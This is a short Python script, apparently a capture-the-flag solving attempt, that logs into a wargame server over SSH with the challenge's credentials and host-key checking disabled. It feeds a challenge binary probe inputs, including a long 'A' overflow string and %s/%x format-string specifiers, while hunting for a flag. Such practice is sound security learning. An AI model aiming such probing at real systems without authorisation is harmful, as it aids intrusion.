#!/usr/bin/env python3

import pexpect

child = pexpect.spawn("ssh -o StrictHostKeyChecking=no -p 10101 basic9@pwn.w3challs.com", timeout=30)
child.expect([b'password:', b'Password:'])
child.sendline(b"basic9")
child.expect([b'\\$'])
print("[✓] Conectado!")

print("\n[*] Ejecutando SIN argumentos (como dice el mensaje)...")

child.sendline(b"/home/basic9/basic9")
child.expect([b'\\$', b':', b'>', b'?'], timeout=5)
output = child.before + (child.after if child.after else b'')

print(output.decode('utf-8', errors='ignore'))

# Si pide input, probar varios
if b':' in output or b'>' in output:
    print("\n[*] El programa espera input...")
    
    inputs = [b'test', b'password', b'flag', b'', b'A'*100, b'%s', b'%x']
    
    for inp in inputs:
        print(f"Probando: {inp}")
        
        child.sendline(b"/home/basic9/basic9")
        child.expect([b':', b'>'], timeout=2)
        child.sendline(inp)
        child.expect([b'\\$'], timeout=2)
        
        output = child.before
        if b'W3C' in output:
            print(f"\n🔥 FLAG: {output.decode('utf-8', errors='ignore')}")
            break

child.close()